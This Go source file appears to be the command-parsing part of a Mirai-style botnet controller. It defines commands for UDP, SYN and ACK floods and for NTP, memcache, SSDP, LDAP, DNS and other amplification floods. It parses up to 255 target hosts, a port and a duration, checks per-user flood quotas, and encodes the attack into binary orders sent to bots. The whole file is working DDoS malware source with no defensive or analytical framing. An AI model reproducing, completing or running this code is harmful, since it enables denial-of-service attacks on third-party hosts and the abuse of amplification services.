package main

import
(
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type command_info struct {
    typ uint8
    id uint8
    description string
}

type command struct { // flood 
    typ uint8
    id uint8
    num_of_targets uint8
    command string
    domain map[uint8]string
    targets map[uint8]uint32
    port uint16
    duration uint32
}

var command_info_lookup map[string]command_info = map[string]command_info {
    // Floods
    "udpflood": command_info {
        1,
        0,
        "UDP flood",
    },
    "synflood": command_info {
        1,
        1,
        "TCP SYN flood optimized for more PPS",
    },
    "ackflood": command_info {
        1,
        2,
        "TCP ACK flood optimized for a more volumetric flood",
    },
    "ntpflood": command_info {
        1,
        3,
        "NTP amplification flood",
    },
    "memcacheflood": command_info {
        1,
        4,
        "MEMCACHE amplification flood",
    },
    "ssdpflood": command_info {
        1,
        5,
        "SSDP amplification flood",
    },
    "netbiosflood": command_info {
        1,
        6,
        "NETBIOS amplification flood",
    },
    "portmapflood": command_info {
        1,
        7,
        "PORTMAP amplification flood",
    },
    "ldapflood": command_info {
        1,
        8,
        "LDAP amplification flood",
    },
    "mdnsflood": command_info {
        1,
        9,
        "MDNS amplification flood",
    },
    "dnsflood": command_info {
        1,
        10,
        "DNS water torture flood",
    },
    "greflood": command_info {
        1,
        11,
        "GRE flood",
    },
    // Utilities
    "kill": command_info {
        0,
        0,
        "Terminates the current instance",
    }, 
    "adduser": command_info {
        0,
        1,
        "Add user to database",
    },
}

func new_command(str string, admin int, flood_cooldown uint32, t uint8, max_time int, username string, max_bots int) (*command, error, bool) {
    cmd := &command{0, 0, 0, "", make(map[uint8]string), make(map[uint8]uint32), 0, 0}
    args, _ := shellwords.Parse(str)

    var cmd_info command_info
    var exists bool
    var dns bool
    var targets string
    var flood string

    if len(args) == 0 {
        return nil, errors.New("Please specify a valid command\r\n"), false
    }

    cmd_info, exists = command_info_lookup[args[0]]
    if !exists {
        return nil, errors.New(fmt.Sprintf("Invalid command near %s\r\n", args[0])), false
    }

    flood = args[0]

    cmd.typ = uint8(t)
    cmd.id = cmd_info.id

    args = args[1:]

    if len(args) != 0 {
        cmd.command = args[0]
    }

    // Utility    
    if cmd.typ == 0 {
        return cmd, nil, false
    }

    if len(args) == 0 {
        return nil, errors.New("Specify a target/domain\r\n"), false
    }

    targets = args[0]

    sd := strings.Split(args[0], ",")
    if len(sd) > 255 {
        return nil, errors.New(fmt.Sprintf("No more than 255 hosts are allowed to be targeted\r\n")), false
    }
 
    dns = false

    for _, d := range sd {
        r := net.ParseIP(d)
        if r != nil {
            cmd.targets[cmd.num_of_targets] = binary.BigEndian.Uint32(r[12:])
            cmd.num_of_targets++
            continue
        }
        _, err := net.ResolveIPAddr("ip4", d)
        if err != nil {
            return nil, errors.New(fmt.Sprintf("Failed to parse target/domain near %s\r\n", d)), false
        }
        dns = true
        cmd.domain[cmd.num_of_targets] = d
        cmd.num_of_targets++
    }

    args = args[1:]
    if len(args) == 0 {
        return nil, errors.New("Specify a port\r\n"), false
    }

    port, err := strconv.Atoi(args[0])
    if err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to parse the port near %s\r\n", args[0])), false
    }

    if port <= 0 || port > 65535 {
        return nil, errors.New(fmt.Sprintf("Invalid port near %s, must be within range of 1 and 65535\r\n", args[0])), false
    }

    cmd.port = uint16(port)
    args = args[1:]

    if len(args) == 0 {
        return nil, errors.New("Must specify a duration\r\n"), false
    }
    
    duration, err := strconv.Atoi(args[0])
    if err != nil || duration == 0 || duration == -1 || duration == 3600 {
        return nil, errors.New(fmt.Sprintf("Invalid duration near %s\r\n", args[0])), false
    }

    if max_time != -1 && duration > max_time {
        return nil, errors.New(fmt.Sprintf("Specified a invalid flood time near %s, please respecify between %d and below\r\n", args[0], max_time)), false
    }

    cmd.duration = uint32(duration)

    err = db.can_flood(username, cmd.duration, flood_cooldown, max_bots, flood, targets, cmd.port)
    if err != nil {
        return nil, err, false
    }

    return cmd, nil, dns
}

func (this *command) build_flood_dns(bot_count int) {
    buf := make([]byte, 0)
    var tmp []byte

    buf = append(buf, byte(this.typ))
    buf = append(buf, byte(this.id))
    buf = append(buf, byte(this.num_of_targets))    
    
    for o := 0; o < int(this.num_of_targets); o++ {
        buf = append(buf, byte(len(this.domain[uint8(o)])))
        domain_str := []byte(this.domain[uint8(o)])
        buf = append(buf, domain_str...)
    }

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, this.port)
    buf = append(buf, tmp...)

    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.duration)
    buf = append(buf, tmp...)

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    if len(buf) > 1024 {
        return
    }

    go cs.send_command(buf, bot_count)
}

func (this *command) build_flood_ipv4(bot_count int) {
    buf := make([]byte, 0)
    var tmp []byte

    buf = append(buf, byte(this.typ))
    buf = append(buf, byte(this.id))
    buf = append(buf, byte(this.num_of_targets))    

    for j := 0; j < int(this.num_of_targets); j++ {
        tmp = make([]byte, 4)
        binary.BigEndian.PutUint32(tmp, this.targets[uint8(j)])
        buf = append(buf, tmp...)
    } 

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, this.port)
    buf = append(buf, tmp...)

    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.duration)
    buf = append(buf, tmp...)

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    if len(buf) > 1024 {
        return
    }

    go cs.send_command(buf, bot_count)
}

func (this *command) build_util(bot_count int) {
    buf := make([]byte, 0)
    var tmp []byte

    buf = append(buf, byte(this.typ))
    buf = append(buf, byte(this.id))

    le := len(this.command)
    if le > 0 {
        buf = append(buf, byte(le))
    }

    str := []byte(this.command)
    buf = append(buf, str...)

    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    if len(buf) > 1024 {
        return
    }

    go cs.send_command(buf, bot_count)
}